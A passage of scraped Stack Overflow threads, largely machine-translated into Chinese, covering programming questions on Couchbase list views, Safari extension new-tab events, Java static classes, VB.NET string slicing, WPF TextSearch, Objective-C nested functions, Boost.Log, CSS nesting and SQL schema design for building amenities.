ActiveSheet.Protect Password:="pass", DrawingObjects:=True, Contents:=True 
```

或将图表作为工作表插入

# list - 使用 Couchbase 上的列表访问视图的正确方法

> ID：10148710
> 
> 赞同：0
> 
> 时间：2012-04-13T21:43:15.970
> 
> 标签：list, view, couchbase

在 Mac 上使用 Couchbase 2.0 dp4

尝试使用列表来进一步过滤我的观点。在这一点上，我只是试图让任何列表都符合我的观点。到目前为止，我能得到的是： {"error":"unknown_error","re​​ason":"undef"};

这是我的设计文档：

```
 {
    "_id": "_design/AllScopes",
    "_rev": "6-48c8555a",
    "views": {
    "AllScopes": {
        "map": "function(doc) {\n\n  if (doc.scope.search(/^\\{?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\}?$/i) >= 0)\n  {\n    var obj = {};\n    obj[doc.key] = doc.value;\n    emit(doc.scope, obj );\n  }\n\n}",
        "reduce": "function(keys, values, rereduce) { ..removed..}"
    }
},
"lists": {
    "ListScopes": "function(head, req) {\n  var row;\n  start({\n    \"headers\": {\n      \"Content-Type\": \"text/html\"\n     }\n  });\n  while(row = getRow()) {\n    send(row.value);\n  }\n}"
} 
```

}

当我查询我的视图时：localhost:8092/default/_design/AllScopes/_view/AllScopes?group=true

结果是：

```
{"rows":[
{"key":"016f77d2-dd42-41b4-98e7-50daa14d9e02","value":{"row":"b2f31852-a864-4680-9242-487181844b31","parent":{"_type":"Scope","_id":"ea45da3e-5c91-4ef2-b64e-0158a0c83e79","_template":{"_type":"Template","_path":"_level2.trylistorview","_mode":"server"}},"mode":"edit","g":"4592f903-7815-4e6c-97be-503626c6628c","_template":"_level2.views","_childname":"views","_activefield":"viewname","_active":false}},
{"key":"026bdb98-52eb-4986-a5c1-a0bfaf928af0","value":{"row":"44ff7ff1-c49b-407e-832b-2777dc69f288","parent":{"_type":"Scope","_id":"676b7fea-8cc8-4e7f-a232-f055ad142b58","_template":{"_type":"Template","_path":"_template","_mode":"server"}},"mode":"edit","g":"4592f903-7815-4e6c-97be-503626c6628c","_template":"_template","_activefield":"options","_active":false}}
....
]} 
```

然后尝试使用带有视图的列表 - localhost:8092/default/_design/AllScopes/_list/ListScopes/AllScopes?group=true。

我能得到的只是上面的未知错误。我尝试了不同的列表功能代码和不同的 url 配置，但都失败了。此列表函数来自此处的示例：[http ://wiki.apache.org/couchdb/Formatting_with_Show_and_List#Listing_Views_with_CouchDB_0.10_and_later](http://wiki.apache.org/couchdb/Formatting_with_Show_and_List#Listing_Views_with_CouchDB_0.10_and_later)

有关如何获得与视图一起使用的简单列表的任何帮助都会有所帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-15T04:02:32.707

我认为 Couchbase 目前不支持列表，但它是将来会添加的功能。Couchbase 和 CouchDB 有很多共同点，但它们彼此并不完全兼容。

# javascript - Safari 扩展：全新标签的事件？

> ID：10148711
> 
> 赞同：3
> 
> 时间：2012-04-13T21:43:19.427
> 
> 标签：javascript, safari, dom-events, safari-extension

我希望将 Safari 中的新标签重定向到某个 URL，实质上是更改默认的新标签页。但是，我不想重定向通过以下链接打开的新选项卡。

Windows 和选项卡[API](http://developer.apple.com/library/safari/#documentation/Tools/Conceptual/SafariExtensionGuide/WorkingwithWindowsandTabs/WorkingwithWindowsandTabs.html)描述选项卡“打开”事件，但这些事件会在*任何*新选项卡打开（包括从链接打开的新选项卡）时触发。

有没有办法只为那些通过单击新选项卡按钮创建的选项卡捕获新选项卡事件？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-14T23:57:09.403

在您的`open`事件处理程序中，首先检查事件目标是否是选项卡。如果是，请`beforeNavigate`在该选项卡上为该事件注册一个事件处理程序。`beforeNavigate`如果事件在 50 毫秒内未触发，还设置一个超时以取消注册处理程序。例如：

```
function handleOpen(e) {
    if (e.target instanceof SafariBrowserTab) {
        e.target.addEventListener('beforeNavigate', handleBeforeNavigate, false);
        setTimeout(function () {
            e.target.removeEventListener('beforeNavigate', handleBeforeNavigate, false);
        }, 50);
    }
} 
```

`beforeNavigate`现在，标签打开事件之后的事件有三个相关的可能结果。

**情况 1**：`beforeNavigate`事件不会在超时内触发。这通常意味着选项卡是空的。空标签不能是链接点击的结果，所以我们可以在 timeout 函数中添加一些代码来做任何我们喜欢的事情：

```
function handleOpen(e) {
    if (e.target instanceof SafariBrowserTab) {
        e.target.addEventListener('beforeNavigate', handleBeforeNavigate, false);
        setTimeout(function () {
            e.target.removeEventListener('beforeNavigate', handleBeforeNavigate, false);
            takeOverTab();
        }, 50);
    }
} 
```

**情况 2**：`beforeNavigate`事件将触发，其`url`属性值为`null`. 这意味着该选项卡将加载“热门站点”页面或“书签”页面（两个特殊的 Safari 页面，它们是新选项卡的选项之一）。就像一个空标签一样，这样的标签不可能是链接点击的结果，所以我们可以对标签做我们喜欢的事情。例如：

```
function handleBeforeNavigate(e) {
    e.target.removeEventListener('beforeNavigate', handleBeforeNavigate, false);
    if (e.url === null) {
        takeOverTab();
    }
} 
```

**情况 3**：`beforeNavigate`将触发，其`url`值将是一个非空字符串：即一个实际的 URL。这是一个棘手的情况，因为选项卡可能来自链接单击、new-tab 命令（如果用户已将 Safari 配置为在其主页上打开新选项卡）或其他应用程序或扩展程序的操作。让我们将选项卡是链接单击结果的情况称为案例 3A；它是 new-tab 命令结果的情况，案例 3B；和其他应用案例，案例 3C。

我想不出区分3B和3C的方法。如果真的没有办法区分这两种情况，那可能对您的应用程序非常不利，因为您可能不想重定向其他应用程序打开的选项卡。

如果您不在乎您的应用程序是否会干扰 3C 选项卡，那么至少有一种方法可以区分 3A 选项卡和 3B/3C 选项卡。这是我想到的方式：

*   在每个页面中使用注入脚本来监听链接点击。单击链接时，将 URL 和单击时间转发到全局页面，全局页面将记住它们以供将来参考。例如：

    ```
    function handleMessage(e) {
        if (e.name === 'linkClicked') {
            lastClickedLinkUrl = e.message.url;
            lastLinkClickTime = e.message.clickTime;
        }
    } 
    ```

*   在您的`beforeNavigate`处理程序中，测试事件的`url`值是否与最后单击链接的 URL 不同。如果是，则新选项卡不是由该链接单击产生的，因此它可能不是由任何链接单击产生的。如果这两个 URL 相同，请检查自上次链接单击后是否已超过 100 毫秒。如果是这种情况，那么 URL 相同可能只是巧合，因此您可以再次推断新选项卡不是由链接点击产生的。例如：

    ```
    function handleBeforeNavigate(e) {
        e.target.removeEventListener('beforeNavigate', handleBeforeNavigate, false);
        if (e.url === null) {
            takeOverTab();
        } else if (e.url !== lastClickedLinkUrl || (new Date) - lastLinkClickTime > 100) {
            takeOverTab();
        }
    } 
    ```

请注意，这种检测方法并非万无一失。可能有很多方法可能出错。不过，我希望这会有所帮助。

# java - How to define child static class which extends parent abstract?

> ID：10148715
> 
> 赞同：3
> 
> 时间：2012-04-13T21:43:30.633
> 
> 标签：java, oop

I need a parent public abstract class which will have multiple child public static classes. I need only one instance of a Weapon class, a few static classes Bow, Sword< etc which extend the parent and can exist also only in one instance (at least I need to be able to get their static fiels). How to do it properly?

```
public abstract  class Weapon {
    ...
}
public static class Bow extends  Weapon { 
      static String type = "Bow ";
      static  int damage = 10;
}

public static class Sword extends  Weapon { 
      static String type = "Sword";
      static int damage = 10;
} 
```

Getting error:

```
Illegal modifier for the class Sword; only public, abstract & final are permitted 
```

* * *

I removed static and it worked:

```
public final class   Sword extends  Weapon { 
      static String type = "Sword";
      static int hitPointsTaken = 10;
} 
```

* * *

I can compile this `System.out.println( Sword.type );` but not this `System.out.println( Weapon.Sword.type );` . Does it mean that I cannot access child through parent abstract?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:52:26.700

If you absolutely have to implement this model, you're looking at nesting:

```
public abstract  class Weapon {

    public static class Bow extends  Weapon { 
          static String type = "Bow ";
          static  int hitPointsTaken = 10;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:48:45.593

In Java, only nested classes can be static, and it doesn't mean what you think it means, then, either. What you really want to do if something should only have one instance is use a Singleton pattern: [http://en.wikipedia.org/wiki/Singleton_pattern#Example](http://en.wikipedia.org/wiki/Singleton_pattern#Example)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-13T21:58:02.530

You cannot declare a public static class out of the parent class scope. Try doing like this

```
public abstract class Weapon {
    public abstract void usage();

    public static class Sword extends Test{

        @Override
        public void usage() {
            // TODO Auto-generated method stub

        }

    }
} 
```

One instance you can achieve it by making the constructor of Weapon class as private and have a getInstance() method to create a single instance of the class. This is known as Singleton pattern, but please make it singleton if your design really needs else don't go for that because it will make your code tough to write tests and also for future changes.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-13T21:47:18.697

If an **Object** can only exist in one instance (i.e. I only have one sword in my werehouse), it doesn't mean it should be a **static Class**. It should still be an object. What if by some cosmic event your best friend the blacksmith would give you a free `Sword` tommorow? What would you do then?

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-13T21:52:43.707

If you want to access a single instance of the Bow class statically, you can make the Bow class have a non-public constructor and initialize a public static instance of it. (`public static Bow THE_BOW = new Bow(...);`) This should take care of your static and inheritance desires. If this doesn't make sense let me know and I'll provide a code example.

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-13T21:57:05.263

I think you are miss understanding the meaning of the static keyword. I am new to Java so I had to go look it up myself. (that is one of the reasons I surf this site so much... I learn a lot too). I found [this: Secrets of Static in Java with Example](http://javarevisited.blogspot.ca/2011/11/static-keyword-method-variable-java.html) site in my bookmarks that explains the static keyword in detail. Good luck with your project.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-14T20:32:28.270

Isn't this an `enum` pattern?

```
public enum Weapon {
  Bow(10),
  Sword(10);

  private int damage;

  Weapon (int damage) {
    this.damage = damage;
  }

  public int getDamage () {
    return damage;
  }
} 
```

**Added** ... or more dramatically

```
public enum Weapon {
  Bow(10) {
    @Override
    public void strike(Warrior warrior) {
      // Inflict the normal damage.
      super.strike(warrior);
      // Sometimes also sicken.
      if ( Math.random() > .95 ) {
        warrior.sicken(Illness.ArrowInTheKnee);
      }
    }
  },
  Sword(10) {
    @Override
    public void strike(Warrior warrior) {
      // Inflict the normal damage.
      super.strike(warrior);
      // Sometimes also sicken.
      if ( Math.random() > .75 ) {
        warrior.sicken(Illness.StabInTheBack);
      }
    }
  };

  // Normal damage inflicted.
  private int damage;

  Weapon(int damage) {
    this.damage = damage;
  }

  public int getDamage() {
    return damage;
  }

  public void strike(Warrior warrior) {
    warrior.inflict(damage);
  }

  // Placeholder
  public interface Warrior {
    public void inflict(int damage);
    public void terrorise(int fear);
    public void sicken (Illness illness);
  }

  enum Illness {
    StabInTheBack,
    ArrowInTheKnee;
  }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-25T05:24:21.733

The best way to do it is use Singleton pattern for your 'class Weapon'.

Make your constructor private and use getInstance() method to retrieve your Weapon instance. After this create your subclasses for Bow and Sword.

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-05-16T18:40:22.000

you can use subclass as static class like below

```
public class Bow extends  Weapon {

  private static Bow object = null;

  public Bow(){
    object = this;
  }

  public static getObjectAsStatic(){
    return object;
  }

} 
```

Now you can call any class member with "Bow.getObjectAsStatic()" like Bow.getObjectAsStatic().classMembers

# vb.net - 在Visual Basic中切片字符串

> ID：10148718
> 
> 赞同：2
> 
> 时间：2012-04-13T21:44:19.370
> 
> 标签：vb.net, string

我最近学会了在 python 编程中对字符串进行切片：

```
>>> word = "Coffee"
>>> word[-3:]
>>> 'fee' 
```

我想在 vb 中做同样的事情。我试图创建一个条件状态如下：

```
If Me.FIELD1.Length > 2 Then
    Me.FIELD1 = Me.FIELD1[-3:5] 
```

这似乎出错了。我不确定 vb 是否会像 python 一样进行切片。谁能建议如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:53:24.310

```
 Me.FIELD1 = Me.FIELD1.Substring(3); 
```

这将返回费用参见[VB.Net 子字符串示例](http://www.dotnetperls.com/substring-vbnet)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:47:36.643

您需要查看 String.Left、String.Substring 和 String.Right 函数。

# xcode - 使用 MacRuby 将控制器链接到 Xcode 中的窗口

> ID：10148719
> 
> 赞同：1
> 
> 时间：2012-04-13T21:44:28.623
> 
> 标签：xcode, macruby

使用 Xcode 4.3.2 和 MacRuby .10，我启动了一个新的 MacRuby 项目并创建了一个名为 SetupWindowController.rb 的文件，其中包含以下代码：

```
class SetupWindowController < NSWindowController
  attr_accessor :window, :submit, :path_to_root

  def set_root_path(sender)

  end

end 
```

在 .xib 文件中，我将一个对象拖到带有 App Delegate、文件所有者和 Windows 的栏上，但是当我尝试将它的类设置为 SetupWindowController 时......什么也没有。

这可能是什么原因造成的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-14T07:58:50.883

这实际上是您使用的 Xcode 版本的问题。Xcode 现在安装在不同的路径中（/Applications 而不是 /Developers），并且 Xcode 调用 MacRuby 脚本来获取有关用 Ruby 编写的可用类和方法的信息。由于路径更改，此调用失败，Xcode 看不到您的出口或操作。

要解决此问题，您需要将 MacRuby 更新到最新版本，这将是那里可用的每晚版本：http: [//www.macruby.org/files/nightlies/macruby_nightly-latest.pkg](http://www.macruby.org/files/nightlies/macruby_nightly-latest.pkg)

0.12 即将发布（0.11 将被跳过），但 nightly build 非常稳定。

# .net - 在 DataTemplate 中使用 TextSearch.Text

> ID：10148721
> 
> 赞同：7
> 
> 时间：2012-04-13T21:44:43.997
> 
> 标签：.net, wpf, binding, datatemplate, text-search

我有一个非常简单的示例：具有单个表单的 WPF 表单应用程序，其中包含带有数据的字典：

```
Dim dict As New Collections.Generic.Dictionary(Of String, String)

Private Sub MainWindow_Loaded() Handles Me.Loaded
    dict.Add("One", "1")
    dict.Add("Two", "2")
    dict.Add("Three", "3")

    lst1.ItemsSource = dict
End Sub 
```

在表单上，​​我有一个 ListBox（名为“lst1”），它使用“dict”作为项目源：

```
<ListBox x:Name="lst1">
    <ListBox.ItemTemplate>
        <DataTemplate>
            <Label Content="{Binding Value}" 
                   TextSearch.Text="{Binding Path=Key, Mode=OneWay}" />
        </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

我还有一个未绑定的列表框，手动预填充值：

```
<ListBox>
    <Label TextSearch.Text="One" Content="1" />
    <Label TextSearch.Text="Two" Content="2" />
    <Label TextSearch.Text="Three" Content="3" />
</ListBox> 
```

所以当我启动应用程序时，它看起来像这样：

![应用程序窗口](../Images/a6e20179400b933ade89c90a6228b2c2.png)

## 问题：

如果我尝试通过键入“一”、“二”或“三”来使用键盘导航项目，我只能在非绑定列表框中成功。绑定列表框失败。

一些评论： 1.）如果我在绑定列表框中按“[”，焦点以循环方式从一个项目变为另一个项目：它从 1 变为 2，从 2 变为 3，从 3 变为 1，从 1 再次变为 2等 2.) 我已经用 Snoop 检查了应用程序。我发现绑定列表框和非绑定列表框之间的一个区别。两个列表框都在标签控件（在 ItemsPresenter 内）上设置了 TextSearch.Text 属性。但对于非绑定情况：TextSearch.Text 属性的“值源”是“本地”。对于绑定案例：“值源”是“ParentTemplate”。

**PS（和NB）** 我知道我可以在列表框上使用TextSearch.TextPath，但这不是我需要的:) 此外，设置ListViewItem 的TextSearch.Text 属性（通过使用样式）也无济于事。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-16T04:47:20.027

让我首先解释一下 TextSearch 如何与 ItemsControl 一起工作：

`ItemsSource`TextSearch 的实现会枚举属性的实际数据项并*直接*查看这些数据项以读取`Text`依赖项属性。当您`ListBoxItem`像在示例中那样将 s 放入其中时，它会起作用，因为实际项目是具有“附加”到它们`ListBoxItem`的依赖属性的实例。`Text`一旦你绑定到你的`Dictionary<>`它现在直接查看`KeyValuePair<>`不是 s 的实例，`DependencyObject`因此不能/没有它们的`TextSearch.Text`属性。这也是为什么在via上设置`TextSearch.Text`属性没有效果的原因：它描述了您的数据在可视化树中的外观，但是`ListBoxItem``ItemContainerStyle``ItemContainerStyle``TextSearch`引擎只考虑原始数据源。在 UI 中如何设置数据的样式并不重要，这就是为什么修改 a`DataTemplate`永远不会对`TextSearch`.

一种替代方法是创建一个视图模型类，该类继承自您根据要搜索的值`DependencyObject`设置附加属性的位置。`TextSearch.Text`下面是一些示例代码，展示了它是如何工作的：

```
private sealed class MyListBoxItem : DependencyObject
{
    public static readonly DependencyProperty KeyProperty = DependencyProperty.Register("Key", typeof(string), typeof(MyListBoxItem), new FrameworkPropertyMetadata(string.Empty));
    public static readonly DependencyProperty ValueProperty = DependencyProperty.Register("Value", typeof(string), typeof(MyListBoxItem), new FrameworkPropertyMetadata(string.Empty));

    public string Key
    {
        get
        {
            return (string)GetValue(KeyProperty);
        }
        set
        {
            SetValue(KeyProperty, value);
            SetValue(TextSearch.TextProperty, value);
        }
    }

    public string Value
    {
        get
        {
            return (string)GetValue(ValueProperty);
        }
        set
        {
            SetValue(ValueProperty, value);
        }
    }
}

// Assign a list of these as the list box's ItemsSource
this.listBox.ItemsSource = new List<MyListBoxItem>
{
    new MyListBoxItem { Key = "One", Value = "1" },
    new MyListBoxItem { Key = "Two", Value = "2" },
    new MyListBoxItem { Key = "Three", Value = "3" }
}; 
```

ListBox 定义如下所示：

```
<ListBox Name="listBox">
    <ListBox.ItemTemplate>
        <DataTemplate>
            <TextBlock Text="{Binding Value}" />
        </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

任何其他替代方案都需要您使用`TextSearch.TextPath`，但您似乎已经死定了。如果您接受修改`DataTemplate`永远不会起作用，我建议的解决方案是简单地创建一个 POCO 视图模型，该模型具有您要用于搜索的属性并将其指定为`TextSearch.TextPath`. 这是完成您正在做的事情的最轻巧、最简单的方法。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-18T11:33:20.130

`ListBoxItem`一个可能的解决方案是使用 TextSearch 的后备行为，即在if no `TextSearch.Text`or `TextSearch.TextPath`are set的数据项上使用 .ToString() 。

例如，这将允许您在不指定 TextSearch.Text 或 .TextPath 的情况下进行搜索。

```
<Page.DataContext>
    <Samples:TextSearchViewModel/>
</Page.DataContext>

<Grid>
    <ListBox ItemsSource="{Binding Items}" 
             IsTextSearchCaseSensitive="False" 
             IsTextSearchEnabled="True">
        <ListBox.ItemTemplate>
            <DataTemplate>
                <Label Content="{Binding Value}" />
            </DataTemplate>
        </ListBox.ItemTemplate>
    </ListBox>
</Grid>

public class TextSearchItem
{
    public int Value { get; set; }
    public string SearchText { get; set; }

    public override string ToString()
    {
        return SearchText;
    }
}

public class TextSearchViewModel
{
    public TextSearchViewModel()
    {
        Items = new List<TextSearchItem>
                    {
                        new TextSearchItem{ Value = 1, SearchText = "One"},
                        new TextSearchItem{ Value = 2, SearchText = "Two"},
                        new TextSearchItem{ Value = 3, SearchText = "Three"},
                        new TextSearchItem{ Value = 4, SearchText = "Four"},
                    };
    }

    public IEnumerable<TextSearchItem> Items { get; set; }
} 
```

# objective-c - 预期的 ';' 在声明结束时

> ID：10148724
> 
> 赞同：0
> 
> 时间：2012-04-13T21:44:47.600
> 
> 标签：objective-c, xcode

我收到以下代码的此错误消息，但它根本没有意义。你能检查一下这段代码并告诉你有什么问题吗？已在相关行注释了代码。

```
#import <Foundation/Foundation.h>

typedef struct {
    float exchangeRate;
    double budget;
    double euroTransaction;
} budget;

int main(int argc, const char * argv[])
{
    budget vacationBudget;

    void spendDollars (double dollars) {  //Expected ';' at end of declaration
        vacationBudget.budget -= 100;
    }

    void chargeEuros(double euros) {
        vacationBudget.euroTransaction = euros*vacationBudget.exchangeRate;
        vacationBudget.budget -= vacationBudget.euroTransaction;
    }

    vacationBudget.exchangeRate = 1.2500;
    vacationBudget.budget = 1000.00;
    double numberDollars = 100;
    double numberEuros = 100;

    spendDollars(numberDollars);
    NSLog(@"Converting %.2f US dollars into euros leaves $%.2f", numberDollars, vacationBudget.budget);

    NSLog(@"Charging %.2f euros leaves $%.2f", numberEuros, vacationBudget.budget);

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:47:03.567

将pendDollars 和chargeEuros 函数移到main 函数之外。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:49:03.223

函数不能在 main 中。改成：

```
#import <Foundation/Foundation.h>

    typedef struct {
        float exchangeRate;
        double budget;
        double euroTransaction;
    } budget;

budget vacationBudget;

void spendDollars (double dollars) {  //Expected ';' at end of declaration
            vacationBudget.budget -= 100;
    }

    void chargeEuros(double euros) {
            vacationBudget.euroTransaction = euros*vacationBudget.exchangeRate;
            vacationBudget.budget -= vacationBudget.euroTransaction;
    }

    int main(int argc, const char * argv[])
    {

        vacationBudget.exchangeRate = 1.2500;
        vacationBudget.budget = 1000.00;
        double numberDollars = 100;
        double numberEuros = 100;

        spendDollars(numberDollars);
        NSLog(@"Converting %.2f US dollars into euros leaves $%.2f", numberDollars, vacationBudget.budget);

        NSLog(@"Charging %.2f euros leaves $%.2f", numberEuros, vacationBudget.budget);

        return 0;
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T21:47:40.883

在函数中包含函数不是一个好主意（因为它不会编译 - 即你所看到的 - 而且它没有逻辑意义），将 sendDollars 和 changeEuros 移到 main 之外并将vacationBudget作为参数传递

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-13T22:01:32.170

那是因为您在另一个函数 ( ) 中*定义* 了一个函数 ( )。不允许嵌套函数，从这个意义上说，它们总是“全局”的。`spendDollars``main`

但是，您可以在另一个函数中 *声明*一个函数，然后作为编译器的线索：该函数在其他地方声明，但现在它知道参数和返回类型（`int`如果您使用未声明的函数，则默认为） .

因此，编译器在另一个函数中看到函数语法，它期望它是一个*声明*，就像函数签名一样。然后它看到左大括号并生成错误，因为声明在下一个块之前没有分号结束。

您需要将函数`spendDollars` 和移动`chargeEuros` 到 outside `main`，因此您必须传递对要修改的局部变量的引用。这些应该工作：

```
void spendDollars (budget *b, double dollars)
{
    b->budget -= 100;
}

void chargeEuros(budget *b, double euros) {
    b->euroTransaction = euros*vacationBudget.exchangeRate;
    b->budget -= vacationBudget.euroTransaction;
} 
```

请注意， `->`运算符将直接在指针上工作，就像您使用过的一样

```
(*b).budget -= 100; 
```

取消引用指针并对结构进行操作。将您的新功能称为

```
spendDollars(&vacationBudget, numberDollars); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-13T21:53:44.433

你的功能`spendDollars`，`chargeEuros`不能是主要的。

但是不能在方法中创建方法是不正确的。Sinds iOS 4.0 你可以创建 Blocks。

有关更多信息，请遵循有关块的[本](http://www.raywenderlich.com/9438/how-to-use-blocks-in-ios-5-tutorial-part-2)教程

# endl - 如何从每个 Boost.Log 行输出中去掉 endl？

> ID：10148728
> 
> 赞同：2
> 
> 时间：2012-04-13T21:45:31.820
> 
> 标签：endl

我是 C++ 程序中 Boost.Log 的新手。我创建了一个名为“simlog”的记录器，然后使用以下行输出我的日志文本：

BOOST_LOG( simlog ) << "一些日志信息";

我不希望将默认的 endl 附加到这样的每个语句中。我宁愿自己控制是否添加 endl。如何使用 Boost.Log 做到这一点？是否有格式设置可以打开/关闭它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-03T01:43:00.153

Boost.Log 的开箱即用功能无法做到这一点。但是，您可以在那里定义自定义接收器后端、实现`do_consume`方法和输出日志消息，而无需尾随`\n`.

有关自定义接收器后端的更多信息，请参见此处：[编写自己的接收](http://boost-log.sourceforge.net/libs/log/doc/html/log/extension.html#log.extension.sinks)器。

# asp.net - 为什么 CSS 类不能包含另一个 CSS 类

> ID：10148733
> 
> 赞同：0
> 
> 时间：2012-04-13T21:46:17.230
> 
> 标签：asp.net, .net, html, css, web

为什么一个 CSS 类不能包含另一个 CSS 类，例如

```
.parentCSS width:100% childCSS 
```

因此，我的文件中确实有很多重复的条目

在 aspx 页面的某处（一个控制多个 CSS 类）和 CSS 文件中的某处（一个 CSS 类有多个重复的属性）。

如果 CSS 嵌套无法实现，任何编写正确 CSS 的建议都会非常有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:48:34.523

因为 CSS 不是这样构建的，所以它不支持嵌套，但是有一个插件[http://lesscss.org/](http://lesscss.org/)允许您以更灵活的方式创建样式表。

> LESS 扩展了 CSS 的动态行为，例如变量、mixin、操作和函数。LESS 使用 Node.js 和 Rhino 在客户端（Chrome、Safari、Firefox）和服务器端运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:57:28.440

不确定问题是什么，但 css 确实允许这样做：

```
.parent,
.parent .child {
    /* css */
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:59:46.247

您必须明确命名所有类：

```
.parentCSS .childCSS { width:100% }
.childCSS { height:100% } 
```

或者将它们组合在标记中：

```
<div class="parentCSS childCSS"></div> 
```

显示您正在尝试做的事情的详细信息/示例可能会有所帮助。

# mysql - 具有便利设施的建筑物的 SQL 结构

> ID：10148738
> 
> 赞同：0
> 
> 时间：2012-04-13T21:46:45.877
> 
> 标签：mysql, database, database-design, relational-database

我有一个我似乎无法找到解决方案的问题。我在这里浏览了类似的答案，但没有什么是我想要的。我对 SQL 相当熟悉，但无论如何都不是专家。

我有一张关于公寓楼信息的表格 - 名称、区域、社区、电话号码、地址、邮编等。目前，我在这张表格中定义了几个便利设施，例如“门卫”、“电梯”、“健身房”（和其他几个）作为tinyints来指示建筑物是否确实具有这种舒适性。然而，我正在整合更多的便利设施类型，我认为这可能是改变结构的时候了，因为在巨大的建筑物桌子上添加柱子并没有太大意义。

因此，我正在寻找一种解决方案，它可以为我提供执行以下操作的最佳能力：1) 根据用户定义的便利设施搜索建筑物（例如，用户选择他想查看必须有健身房和门卫的建筑物，不关心其他人）2）返回有关建筑物的数据，包括建筑物包含的所有便利设施（用于显示信息）

我正在考虑将这些结构分成多对多关系并执行以下操作：1）创建名为“设施”的新表，其中包含所有设施，具有以下结构：id -> 设施名称的唯一 id -> amenity 值的文本描述 -> 例如“pet_friendly”（用于在表单中搜索，不确定是否有必要）

2) 在另一个名为“building_amenities”的表中创建建筑物和便利设施之间的关系表，其结构如下： id -> 关系 building_id 的唯一 id -> 引用建筑物 amenity_id 的 id -> 引用 amenity 的 id value -> tinyint，建筑物是否有便利设施 在这张表中，每栋建筑都会与每个便利设施有关系，并指示它是否有。

我的问题是我不确定这是否是适合这种情况的正确结构，如果我有这种结构，我当然不知道如何实现搜索查询。

非常感谢您对此的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:57:25.840

我建议您创建一个建筑物表、一个设施表和一个关系表。每个建筑物都有一个 ID，每个设施也有一个 ID。要选择所有具有某些设施的建筑物，您只需编写如下查询

```
SELECT *
FROM (relational_table) rt JOIN (buildings_table) bt
    ON rt.id_building = bt.id_building JOIN (amenities_table) at
    ON at.id_amenity = rt.id_amenity
WHERE rt.id_amenity = ... (OR, AND etc.) 
```

要返回带有便利设施的建筑物，您只需将 WHERE 子句更改为 WHERE id_building = x，然后应选择所有便利设施。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:58:40.013

除了 building_amenities 表中的 tinyint 标志之外，我将拥有一切。如果便利设施在现实生活中确实存在，我只会在该表中记录。

这样，您可以编写查询以使用常规连接查找具有给定设施的所有建筑物：

```
select * from buildings
    join building_amenities on buildings.id=building_amenities.building_id
    join amenities on building_amenities.amenity_id=amenities.id
where amenities.name='doorman' 
```

如果你想得到没有（比如）门卫的建筑物，你可以使用左连接：

```
select * from amenities
    left join building_amenities on amenities.id=building_amenities.amenity_id
    left join buildings on building_amenities.buildings_id=buildings.id
where buildings.id is NULL and amenities.name='doorman' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T01:25:31.713

正如菲尔凯恩斯已经建议的那样，您不应该在关联表中包含 TINYINT （伪布尔值）。如果建筑物存在设施，则关联表中应该只有一条记录。

使用多个连接执行良好，但您可以使用 GROUP BY ... HAVING COUNT 获得相同（[甚至稍微更好](https://stackoverflow.com/questions/10121680/sql-query-over-multiple-rows/10121774#10121774)）的性能，并且更容易操作多个条件的查询。

因此，如果您想找到所有具有设施 1、2 和 4 的建筑物，您可以这样做 -

```
SELECT b.*
FROM buildings b
INNER JOIN building_amenities ba
    ON b.id = ba.building_id
WHERE ba.amenity_id IN (1,2,4)
GROUP BY b.id
HAVING COUNT(ab.amenity_id) = 3 
```

如果您想查找所有具有便利设施 1、2、4、7、13、19 和 23 的建筑物，则查询变为 -

```
SELECT b.*
FROM buildings b
INNER JOIN building_amenities ba
    ON b.id = ba.building_id
WHERE ba.amenity_id IN (1,2,4,7,13,19,23)
GROUP BY b.id
HAVING COUNT(ab.amenity_id) = 7 
```

如果您需要显示建筑物的所有设施，您可以在设施表中添加第二个连接 -

```
SELECT b.*, GROUP_CONCAT(DISTINCT ab2.amenity_id)
FROM buildings b
INNER JOIN building_amenities ba
    ON b.id = ba.building_id
INNER JOIN building_amenities ba2
    ON b.id = ba2.building_id
WHERE ba.amenity_id IN (1,2,4,7,13,19,23)
GROUP BY b.id
HAVING COUNT(DISTINCT ab.amenity_id) = 7 
```

# c# - 如何在自定义助手中使用 Html.BeginForm？

> ID：10148739
> 
> 赞同：4
> 
> 时间：2012-04-13T21:46:56.423
> 
> 标签：c#, asp.net-mvc-3, razor, html-helper

所以我试图将 .cshtml 视图中的这种剃刀语法转换为 .cs 中的辅助扩展。Darin 在这里发表了一篇很棒的文章：[https](https://stackoverflow.com/a/8187441/1026459) ://stackoverflow.com/a/8187441/1026459 。但是，我在让它工作时遇到了一些问题。

这是普通的标记

```
